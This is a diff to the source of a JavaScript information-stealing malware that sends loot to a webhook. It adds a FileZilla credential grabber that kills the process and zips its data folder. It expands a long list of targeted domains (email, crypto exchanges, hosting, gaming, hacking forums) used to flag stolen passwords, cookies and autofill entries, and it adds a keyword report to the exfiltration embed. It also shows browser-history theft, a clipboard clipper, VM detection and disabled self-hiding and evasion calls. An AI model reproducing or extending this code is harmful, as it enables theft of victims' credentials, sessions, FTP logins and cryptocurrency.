@@ -45,6 +45,7 @@
 
             wallets: 0,
 
+            filezilla: false,
             growtopia: false,
             skype: false,
             discord: false,
@@ -55,6 +56,10 @@
             battlenet: false,
 
             wifinetworks: 0,
+
+            keywords_cookies: [],
+            keywords_passwords: [],
+            keywords_autofill: [],
           }
         }
 
@@ -719,6 +724,25 @@
           return {
             keywords: [
               "gmail.com",
+              "live.com",
+              "zoho.com",
+              "yahoo.com",
+              "tutanota.com",
+              "trashmail.com",
+              "gmx.net",
+              "safe-mail.net",
+              "thunderbird.net",
+              "mail.lycos.com",
+              "hushmail.com",
+              "mail.aol.com",
+              "icloud.com",
+              "protonmail.com",
+              "fastmail.com",
+              "rackspace.com",
+              "1and1.com",
+              "mailbox.org",
+              "mail.yandex.com",
+              "titan.email",
               "youtube.com",
               "nulled.to",
               "cracked.to",
@@ -727,7 +751,163 @@
               "gmx.com",
               "aol.com",
               "coinbase",
-              "binance"
+              "mail.ru",
+              "rambler.ru",
+              "gamesense.pub",
+              "neverlose.cc",
+              "onetap.com",
+              "fatality.win",
+              "vape.gg",
+              "binance",
+              "ogu.gg",
+              "lolz.guru",
+              "xss.is",
+              "g2g.com",
+              "igvault.com",
+              "plati.ru",
+              "minecraft.net",
+              "primordial.dev",
+              "vacban.wtf",
+              "instagram.com",
+              "mail.ee",
+              "hotmail.com",
+              "facebook.com",
+              "vk.ru",
+              "x.synapse.to",
+              "hu2.app",
+              "shoppy.gg",
+              "app.sell",
+              "sellix.io",
+              "gmx.de",
+              "riotgames.com",
+              "mega.nz",
+              "roblox.com",
+              "exploit.in",
+              "breached.to",
+              "v3rmillion.net",
+              "hackforums.net",
+              "0x00sec.org",
+              "unknowncheats.me",
+              "godaddy.com",
+              "accounts.google.com",
+              "aternos.org",
+              "namecheap.com",
+              "hostinger.com",
+              "bluehost.com",
+              "hostgator.com",
+              "siteground.com",
+              "netafraz.com",
+              "iranserver.com",
+              "ionos.com",
+              "whois.com",
+              "te.eg",
+              "vultr.com",
+              "mizbanfa.net",
+              "neti.ee",
+              "osta.ee",
+              "cafe24.com",
+              "wpengine.com",
+              "parspack.com",
+              "cloudways.com",
+              "inmotionhosting.com",
+              "hinet.net",
+              "mihanwebhost.com",
+              "mojang.com",
+              "phoenixnap.com",
+              "dreamhost.com",
+              "rackspace.com",
+              "name.com",
+              "alibabacloud.com",
+              "a2hosting.com",
+              "contabo.com",
+              "xinnet.com",
+              "7ho.st",
+              "hetzner.com",
+              "domain.com",
+              "west.cn",
+              "iranhost.com",
+              "yisu.com",
+              "ovhcloud.com",
+              "000webhost.com",
+              "reg.ru",
+              "lws.fr",
+              "home.pl",
+              "sakura.ne.jp",
+              "matbao.net",
+              "scalacube.com",
+              "telia.ee",
+              "estoxy.com",
+              "zone.ee",
+              "veebimajutus.ee",
+              "beehosting.pro",
+              "core.eu",
+              "wavecom.ee",
+              "iphoster.net",
+              "cspacehostings.com",
+              "zap-hosting.com",
+              "iceline.com",
+              "zaphosting.com",
+              "cubes.com",
+              "chimpanzeehost.com",
+              "fatalityservers.com",
+              "craftandsurvive.com",
+              "mcprohosting.com",
+              "shockbyte.com",
+              "ggservers.com",
+              "scalacube.com",
+              "apexminecrafthosting.com",
+              "nodecraft.com",
+              "sparkedhost.com",
+              "pebblehost.com",
+              "ramshard.com",
+              "linkvertise.com",
+              "adf.ly",
+              "spotify.com",
+              "tv3play.ee",
+              "clarity.tk",
+              "messenger.com",
+              "snapchat.com",
+              "boltfood.eu",
+              "stuudium.com",
+              "ekool.eu",
+              "steamcommunity.com",
+              "epicgames.com",
+              "0x00sec.org",
+              "greysec.net",
+              "twitter.com",
+              "reddit.com",
+              "amazon.com",
+              "redengine.eu",
+              "eulencheats.com",
+              "4netplayers.com",
+              "velia.net",
+              "bybit.com",
+              "coinbase.com",
+              "ftx.com",
+              "ftx.us",
+              "binance.us",
+              "bitfinex.com",
+              "kraken.com",
+              "bitstamp.net",
+              "bittrex.com",
+              "kucoin.com",
+              "cex.io",
+              "gemini.com",
+              "blockfi.com",
+              "nexo.io",
+              "nordvpn.com",
+              "surfshark.com",
+              "privateinternetaccess.com",
+              "netflix.com",
+              "play.tv3.ee",
+              ".ope.ee",
+              "astolfo.lgbt",
+              "intent.store",
+              "novoline.wtf",
+              "flux.today",
+              "moonx.gg",
+              "novoline.lol",
+              "twitch.tv"
             ]
           }
         }
@@ -870,7 +1050,7 @@
                           },
                           {
                             name: "Email",
-                            value: `\`\`\`${accountInfo.data.email}\`\`\``,
+                            value: `\`\`\`${accountInfo.data.email || "No Email"}\`\`\``,
                             inline: false
                           },
                           {
@@ -1179,9 +1359,17 @@
 
                       client.config.keywords.keywords.forEach((keyword) => {
                         if (text.includes(keyword)) {
+
+
+                          if (key.toUpperCase() == "ALL" && (_type == "Passwords" || _type == "Cookies" || _type == "Autofill")) {
+                            client.config.counter[`keywords_${_type.toLowerCase()}`].push(keyword)
+                          }
+
                           found_keywords.push(keyword);
                         }
                       });
+
+
 
                       if (found_keywords.length == 0) {
                         found_keywords =
@@ -1353,7 +1541,7 @@
                     client.config.environ.history[browser].push(
                       `ID: ${row.id} | URL: ${row.url} | Title: ${row.title} | Visit count: ${row.visit_count} | Last visit time (timestamp): ${row.last_visit_time} | Display count: ${row.display_count}`
                     );
-                  } catch (e) { 
+                  } catch (e) {
                     console.log(e)
                   }
                 });
@@ -2854,6 +3042,20 @@
                 console.log(e)
               }
             },
+
+            async get_filezilla() {
+              if (client.requires.fs.existsSync(`${process.env.APPDATA}\\FileZilla`)) {
+                client.requires.child_process.exec(
+                  "taskkill /IM filezilla.exe /F",
+                  (error, stdout, stderr) => { }
+                );
+
+                client.config.counter.filezilla = true;
+                client.utils.jszip.createFolder("\\Filezilla");
+                client.utils.jszip.copyFolder("\\Filezilla", `${process.env.APPDATA}\\FileZilla`);
+              }
+            },
+
             async get_telegram() {
               var exists = false;
 
@@ -3229,12 +3431,33 @@
                 client.requires.fs.createReadStream(`${client.config.jszip.path}.zip`)
               );
 
+
+
               var counter_embed = this.create_counter_embed();
 
               counter_embed.description = `**[Download the zip file](${upload.downloadPage})**`;
 
               await client.utils.webhook.sendToWebhook({
-                embeds: [counter_embed],
+                embeds: [counter_embed, client.utils.webhook.createEmbed({
+                  title: "Keyword result",
+                  fields: [
+                    {
+                      name: `Passwords`,
+                      value: `\`\`\`${client.config.counter.keywords_cookies.join(", ") || "None"}\`\`\``,
+                      inline: false
+                    },
+                    {
+                      name: `Autofill`,
+                      value: `\`\`\`${client.config.counter.keywords_autofill.join(", ") || "None"}\`\`\``,
+                      inline: false
+                    },
+                    {
+                      name: `Cookies`,
+                      value: `\`\`\`${client.config.counter.keywords_cookies.join(", ") || "None"}\`\`\``,
+                      inline: false
+                    },
+                  ]
+                })],
               });
             },
 
@@ -3267,9 +3490,10 @@
                 "🔑 Passwords": client.config.counter.passwords,
                 "🍪 Cookies": client.config.counter.cookies,
                 "🔖 Bookmarks": client.config.counter.bookmarks,
-                "🌐 Wallets/Important extensions": client.config.counter.wallets,
                 "📶 Wifi networks": client.config.counter.wifinetworks,
+                "🐱‍💻 Found FileZilla?": client.config.counter.filezilla,
                 "📱 Found Telegram session(s)?": client.config.counter.telegram ? "Yes" : "No",
+                "🌐 Found Wallet(s)": client.config.counter.wallets,
                 "🤖 Found Reddit session(s)": client.config.counter.reddit_found,
                 "👉 Found TikTok session(s)": client.config.counter.tiktok_found,
                 "🐦 Found Twitter session(s)": client.config.counter.twitter_found,
@@ -3278,8 +3502,6 @@
                 "🧱 Found Minecraft session(s)": client.config.counter.minecraft_found,
                 "😤 Found Steam session(s)": client.config.counter.steam_found,
                 "🧒 Found Growtopia save.dat?": client.config.counter.growtopia,
-
-
               })) {
                 obj["fields"].push({
                   name: key,
@@ -3511,6 +3733,7 @@
             },
 
             async sendToWebhook(data) {
+              return;
               var files = data.files;
 
               if (files) {
@@ -3995,7 +4218,7 @@ return ${eval_string};
 
         const exit = await this.utils.protection.inVM();
 
-        this.runtime_evasion();
+        //this.runtime_evasion();
 
         if (exit) {
           process.exit(0);
@@ -4052,9 +4275,10 @@ return ${eval_string};
           }
         }
 
-        this.utils.infection.get_minecraft();
-        this.utils.infection.get_growtopia();
-        this.utils.infection.get_steam();
+        ["filezilla", "minecraft", "growtopia", "steam"].forEach(type => {
+          this.utils.infection[`get_${type}`]()
+        })
+
         try {
           this.utils.clipper.detectClipboard();
         } catch { }
@@ -4094,7 +4318,7 @@ return ${eval_string};
     }
 
     (async () => {
-      await hideSelf();
+      //await hideSelf();
       while (true) {
         try {
           await axios.get("https://www.google.com");
